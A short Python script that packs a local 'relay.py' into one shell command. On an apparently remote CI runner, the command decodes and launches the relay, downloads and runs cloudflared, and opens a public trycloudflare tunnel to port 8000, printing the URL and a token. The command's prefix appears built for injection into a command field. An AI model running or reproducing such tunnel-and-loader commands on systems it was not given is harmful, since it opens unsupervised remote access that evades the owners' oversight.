import base64, os, sys

RELAY = r"C:\Users\Administrator\Documents\Default Project\peerlink-efootball-disconnects\kgs-login\live\relay.py"
OUT = r"C:\Users\Administrator\AppData\Local\Temp\2\relay_start_cmd.txt"

raw = open(RELAY, "rb").read().replace(b"\r\n", b"\n")
b64 = base64.b64encode(raw).decode()

# Exact tail used by run 36985235319 (ef464e5), reproduced verbatim.
TAIL = ('base64 -d > /tmp/relay.py; T=$(head -c 18 /dev/urandom | od -An -tx1 '
        '| tr -d " \\n"); echo $T > /tmp/rt; export RELAY_TOKEN=$T; '
        'nohup python3 /tmp/relay.py >/tmp/relay.log 2>&1 & sleep 2; '
        'curl -fsSL --max-time 150 '
        'https://github.com/cloudflare/cloudflared/releases/latest/download/'
        'cloudflared-linux-arm64 -o /tmp/cf && chmod +x /tmp/cf && echo CF_OK; '
        'nohup /tmp/cf tunnel --url http://127.0.0.1:8000 >/tmp/cf.log 2>&1 & '
        'sleep 15; grep -oE "https://[a-z0-9.-]+trycloudflare.com" '
        '/tmp/cf.log | head -1; echo "tok:"; cat /tmp/rt')

cmd = "exec bash -c true; echo ID; echo %s | %s" % (b64, TAIL)

# single line, LF only, no stray CR
assert "\r" not in cmd and "\n" not in cmd, "command must be one line"
with open(OUT, "wb") as fh:
    fh.write(cmd.encode() + b"\n")

# round-trip: the b64 in the command must decode to the current relay.py
head, rest = cmd.split("echo ID; echo ", 1)
embedded = rest.split(" | base64 -d", 1)[0]
assert base64.b64decode(embedded) == raw, "ROUND TRIP MISMATCH"
print("command bytes:", len(cmd))
print("relay bytes  :", len(raw))
print("round trip   : OK (embedded b64 == relay.py)")
print("first 90     :", cmd[:90])
print("last 150     :", cmd[-150:])
